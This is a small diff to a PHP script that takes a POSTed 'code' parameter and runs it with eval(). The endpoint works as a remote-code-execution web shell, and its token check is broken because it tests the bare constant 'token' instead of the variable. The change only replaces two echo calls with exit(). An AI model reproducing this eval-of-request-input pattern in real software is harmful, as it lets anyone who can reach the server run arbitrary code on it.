@@ -6,13 +6,13 @@ $ep = new exploitPatch();
 $codeToRun = $_POST["code"];
 $token = $_POST["token"];
 if(token !== "") {
-  echo "-1";
+  exit("-1");
 }else{
   try {
     eval($codeToRun);
     echo "1";
   } catch (Throwable $t) {
-    echo "-2";
+    exit("-2");
   }
 }
 ?>
